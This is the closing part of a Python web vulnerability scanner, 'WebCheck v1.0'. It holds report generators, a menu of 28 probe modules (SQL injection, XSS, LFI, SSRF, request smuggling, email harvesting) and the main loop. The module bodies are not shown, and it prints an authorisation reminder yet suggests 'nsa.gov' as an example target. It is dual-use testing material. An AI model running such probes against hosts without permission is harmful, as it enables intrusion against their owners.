    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe  = re.sub(r"[^\w]","_",host)
    fname = f"knowitall_{safe}_{ts}.html"
    sev_order  = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sev_colors = {"CRITICAL":"#e74c3c","HIGH":"#e67e22","MEDIUM":"#f1c40f",
                  "LOW":"#3498db","INFO":"#95a5a6"}
    sorted_f   = sorted(FINDINGS, key=lambda x: sev_order.get(x[0],9))
    counts     = {k:0 for k in sev_order}
    for sev,_,_ in sorted_f:
        counts[sev] = counts.get(sev,0)+1
    rows = "".join(
        f"<tr><td><span class='badge' style='background:{sev_colors.get(sev,'#ccc')}'>"
        f"{sev}</span></td><td>{mod}</td><td>{detail}</td></tr>\n"
        for sev,mod,detail in sorted_f
    )
    stat_html = "".join(
        f"<div class='stat'><div class='stat-num' style='color:{col}'>{counts.get(sev,0)}</div>"
        f"<div class='stat-lbl'>{sev}</div></div>\n"
        for sev,col in sev_colors.items()
    )
    html = (
        "<!DOCTYPE html><html lang='en'><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        f"<title>KnowItAll Report -- {host}</title>"
        "<style>"
        "*{box-sizing:border-box;margin:0;padding:0}"
        "body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:2rem}"
        "h1{color:#58a6ff;font-size:1.5rem;margin-bottom:.5rem}"
        ".meta{color:#8b949e;font-size:.85rem;margin-bottom:2rem}"
        ".stats{display:flex;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}"
        ".stat{background:#161b22;border:1px solid #30363d;border-radius:8px;"
        "padding:1rem 1.5rem;text-align:center;min-width:120px}"
        ".stat-num{font-size:2rem;font-weight:bold}"
        ".stat-lbl{font-size:.75rem;color:#8b949e;margin-top:4px;text-transform:uppercase}"
        "table{width:100%;border-collapse:collapse;background:#161b22;"
        "border:1px solid #30363d;border-radius:8px;overflow:hidden}"
        "th{background:#21262d;padding:.75rem 1rem;text-align:left;"
        "font-size:.8rem;color:#8b949e;text-transform:uppercase}"
        "td{padding:.6rem 1rem;border-top:1px solid #21262d;font-size:.85rem;"
        "vertical-align:top;word-break:break-all}"
        "tr:hover td{background:#1c2128}"
        ".badge{display:inline-block;padding:2px 8px;border-radius:4px;"
        "font-size:.75rem;font-weight:bold;color:#fff}"
        ".footer{margin-top:2rem;color:#8b949e;font-size:.8rem}"
        "</style></head><body>"
        "<h1>WebCheck v1.0 Security Report</h1>"
        f"<div class='meta'>Target: {host} &nbsp;|&nbsp; "
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp; "
        f"Runtime: {elapsed:.1f}s &nbsp;|&nbsp; "
        f"Modules: {', '.join(modules_run)}</div>"
        f"<div class='stats'>{stat_html}</div>"
        "<table><thead><tr><th>Severity</th><th>Module</th><th>Finding</th></tr></thead>"
        f"<tbody>{rows if rows else '<tr><td colspan=3 style=text-align:center>No findings</td></tr>'}"
        "</tbody></table>"
        "<div class='footer'>Thank you for using WebCheck!</div>"
        "</body></html>"
    )
    with open(fname,"w",encoding="utf-8") as f:
        f.write(html)
    return fname

def save_json_report(host, elapsed, modules_run):
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe  = re.sub(r"[^\w]","_",host)
    fname = f"webcheck_{safe}_{ts}.json"
    data  = {
        "tool":    "WebCheck v1.0 https://github.com/X3RX3SSec",
        "host":    host,
        "date":    datetime.now().isoformat(),
        "runtime": elapsed,
        "modules": modules_run,
        "findings":[{"severity":s,"module":m,"detail":d} for s,m,d in FINDINGS],
        "summary": {sev: sum(1 for f in FINDINGS if f[0]==sev)
                    for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO")},
    }
    with open(fname,"w",encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    return fname

def save_txt_report(host, elapsed):
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe  = re.sub(r"[^\w]","_",host)
    fname = f"webcheck_{safe}_{ts}.txt"
    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sorted_f  = sorted(FINDINGS, key=lambda x: sev_order.get(x[0],9))
    with open(fname,"w",encoding="utf-8") as f:
        f.write("WebCheck v1.0 Security Report\n")
        f.write(f"Host    : {host}\n")
        f.write(f"Date    : {datetime.now()}\n")
        f.write(f"Runtime : {elapsed:.1f}s\n")
        f.write("="*60+"\n\n")
        for sev,mod,detail in sorted_f:
            f.write(f"[{sev}] {mod}: {detail}\n")
    return fname

# ==============================================================================
#  SUMMARY
# ==============================================================================
def print_summary():
    if not FINDINGS:
        print(f"\n{G}{BOLD}  No findings recorded.{RESET}")
        return
    sev_order  = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sev_colors = {"CRITICAL":R,"HIGH":R,"MEDIUM":Y,"LOW":C,"INFO":DIM}
    sorted_f   = sorted(FINDINGS, key=lambda x: sev_order.get(x[0],9))
    print(f"\n{BOLD}{W}{'='*65}{RESET}")
    print(f"{BOLD}  FINDINGS SUMMARY{RESET}")
    print(f"{BOLD}{W}{'='*65}{RESET}")
    counts = {k:0 for k in sev_order}
    for sev,mod,detail in sorted_f:
        col = sev_colors.get(sev,W)
        print(f"  {col}{BOLD}{sev:<10}{RESET}  {C}{mod:<16}{RESET}  {detail}")
        counts[sev] = counts.get(sev,0)+1
    print(f"\n{BOLD}{W}{'-'*65}{RESET}")
    parts = [f"{sev_colors[s]}{BOLD}{n} {s}{RESET}" for s,n in counts.items() if n>0]
    print(f"  {' | '.join(parts)}")

# ==============================================================================
#  MENU & MAIN
# ==============================================================================
MODULES = {
    "1":  ("Security Headers",           check_headers),
    "2":  ("TLS / SSL",                  check_tls),
    "3":  ("Sensitive Paths",            check_paths),
    "4":  ("Cookie Security",            check_cookies),
    "5":  ("CORS Misconfiguration",      check_cors),
    "6":  ("Dangerous HTTP Methods",     check_methods),
    "7":  ("Port Scan + Banner Grab",    check_ports),
    "8":  ("Tech Fingerprinting",        check_tech),
    "9":  ("CVE Scan + Exploit Hints",   check_cve),
    "10": ("SQL Injection Probes",       check_sqli),
    "11": ("XSS Probes",                 check_xss),
    "12": ("Open Redirect",              check_redirect),
    "13": ("Subdomain Enumeration",      check_subdomains),
    "14": ("DNS & Email Security",       check_dns),
    "15": ("WAF / CDN Detection",        check_waf),
    "16": ("JS Secret Scanner",          check_js_secrets),
    "17": ("HTTP Request Smuggling",     check_smuggling),
    "18": ("Directory Fuzzing",          check_dirfuzz),
    "19": ("SSRF Probe",                 check_ssrf),
    "20": ("Clickjacking",               check_clickjacking),
    "21": ("Authentication Checks",      check_auth),
    "22": ("ASN & IP Reputation",        check_ip_reputation),
    "23": ("Google Dork Generator",      check_dorks),
    "24": ("Email Harvesting",           check_emails),
    "25": ("LFI + PHP Filter Chain",     check_lfi),
    "26": ("JWT Weakness Checker",       check_jwt),
    "27": ("IDOR Probe",                 check_idor),
    "28": ("XXE Detection",              check_xxe),
}

PRESETS = {
    "quick":  ("Quick (headers, TLS, paths, cookies, WAF, IP rep)",
               ["1","2","3","4","15","22"]),
    "web":    ("Web App (XSS, SQLi, CORS, LFI, XXE, SSRF, IDOR, JWT, redirect, auth)",
               ["5","10","11","12","19","20","21","25","26","27","28"]),
    "recon":  ("Recon (ports, tech, subs, DNS, JS, dirfuzz, emails, dorks, IP)",
               ["7","8","13","14","16","18","22","23","24"]),
    "cve":    ("CVE Focus (tech + CVE + smuggling)",
               ["8","9","17"]),
    "full":   ("Full scan -- all 28 modules",
               list(MODULES.keys())),
}

def print_menu():
    print(f"\n{BOLD}  Modules:{RESET}")
    for k,(name,_) in MODULES.items():
        print(f"  {C}{k:>3}{RESET}  {name}")
    print(f"\n{BOLD}  Presets:{RESET}")
    for k,(desc,mods) in PRESETS.items():
        print(f"  {M}{k:<8}{RESET}  {desc}")
    print(f"\n  {C}  a{RESET}  Run ALL modules")
    print(f"  {C}  q{RESET}  Quit\n")

def parse_args():
    ap = argparse.ArgumentParser(
        description="WebCheck v1.0 -- Web Vulnerability & Recon Tool")
    ap.add_argument("--target",  "-t", help="Target host")
    ap.add_argument("--preset",  "-p", help="Preset: quick/web/recon/cve/full")
    ap.add_argument("--modules", "-m", help="Module numbers e.g. 1,3,9")
    ap.add_argument("--output",  "-o", choices=["txt","html","json"], default="txt",
                    help="Report format (default: txt)")
    ap.add_argument("--delay",   "-d", type=int, default=0,
                    help="Delay between requests in ms")
    ap.add_argument("--hosts",   "-H", help="File with list of hosts")
    ap.add_argument("--no-banner", action="store_true")
    return ap.parse_args()

def run_scan(base, selected, output_format):
    global FINDINGS
    FINDINGS.clear()
    modules_run = [MODULES[s][0] for s in selected]
    print(f"\n{BOLD}{W}{'='*65}{RESET}")
    print(f"{BOLD}  Target  : {C}{base}{RESET}")
    print(f"{BOLD}  Modules : {', '.join(selected)}{RESET}")
    print(f"{BOLD}{W}{'='*65}{RESET}")
    start = time.time()
    for s in selected:
        name, fn = MODULES[s]
        try:
            fn(base)
        except KeyboardInterrupt:
            print(f"\n{Y}  Skipping {name}...{RESET}")
        except Exception as e:
            warn(f"{name} error: {e}")
    elapsed = time.time() - start
    print_summary()
    print(f"\n{G}{BOLD}  Scan complete in {elapsed:.1f}s{RESET}")
    return elapsed, modules_run

def main():
    global SCAN_DELAY
    args = parse_args()
    if not args.no_banner:
        banner()
    print(f"{DIM}  Only scan hosts you are authorised to test.{RESET}\n")

    SCAN_DELAY = (args.delay or 0) / 1000.0

    hosts = []
    if args.hosts:
        try:
            with open(args.hosts) as f:
                hosts = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            info(f"Loaded {len(hosts)} hosts from {args.hosts}")
        except Exception as e:
            bad(f"Could not read hosts file: {e}"); sys.exit(1)
    elif args.target:
        hosts = [args.target]
    else:
        host = input(f"{BOLD}  Target host{RESET} (e.g. nsa.gov): ").strip()
        if not host or host.lower() == "q":
            sys.exit(0)
        hosts = [host]

    if args.preset:
        if args.preset not in PRESETS:
            bad(f"Unknown preset '{args.preset}'"); sys.exit(1)
        selected = PRESETS[args.preset][1]
        info(f"Preset '{args.preset}': {PRESETS[args.preset][0]}")
    elif args.modules:
        selected = [m.strip() for m in args.modules.split(",") if m.strip() in MODULES]
        if not selected:
            bad("No valid modules specified"); sys.exit(1)
    elif not args.target and not args.hosts:
        print_menu()
        choice = input(f"{BOLD}  Select{RESET} (e.g. 1,3,9 / preset / a): ").strip().lower()
        if choice == "q": sys.exit(0)
        if choice == "a":
            selected = list(MODULES.keys())
        elif choice in PRESETS:
            selected = PRESETS[choice][1]
            info(f"Preset '{choice}': {PRESETS[choice][0]}")
        else:
            selected = [c.strip() for c in choice.split(",") if c.strip() in MODULES]
            if not selected:
                bad("No valid selection."); sys.exit(1)
    else:
        selected = PRESETS["quick"][1]
        info("No modules specified -- running 'quick' preset")

    output_format = args.output

    for host in hosts:
        if len(hosts) > 1:
            print(f"\n{BOLD}{W}{'#'*65}{RESET}")
            print(f"{BOLD}  HOST: {C}{host}{RESET}")
            print(f"{BOLD}{W}{'#'*65}{RESET}")
        base = normalise(host)
        elapsed, modules_run = run_scan(base, selected, output_format)

        save_choice = "y"
        if not args.target and not args.hosts:
            save_choice = input(f"\n{BOLD}  Save report? [y/N]: {RESET}").strip().lower()

        if save_choice == "y":
            if output_format == "html":
                fname = save_html_report(base, elapsed, modules_run)
            elif output_format == "json":
                fname = save_json_report(base, elapsed, modules_run)
            else:
                fname = save_txt_report(base, elapsed)
            ok(f"Report saved -> {fname}")
            main()
        else:
            main()
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}  Interrupted.{RESET}\n")
